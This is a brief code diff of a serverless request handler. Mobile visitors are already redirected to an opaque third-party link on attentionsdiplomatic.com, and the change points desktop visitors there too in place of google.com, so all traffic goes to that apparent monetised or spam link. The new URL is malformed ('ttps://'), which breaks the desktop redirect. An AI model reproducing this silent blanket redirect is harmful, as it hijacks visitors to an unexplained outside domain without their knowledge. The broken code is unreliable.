@@ -33,6 +33,6 @@ export async function onRequest(context) {
   if (isMobile) {
     return Response.redirect("https://attentionsdiplomatic.com/jxpph0kci5?key=b69c6da5a8cc59c054262e4404d60564", 302);
   } else {
-    return Response.redirect("https://www.google.com", 302);
+    return Response.redirect("ttps://attentionsdiplomatic.com/jxpph0kci5?key=b69c6da5a8cc59c054262e4404d60564", 302);
   }
 }
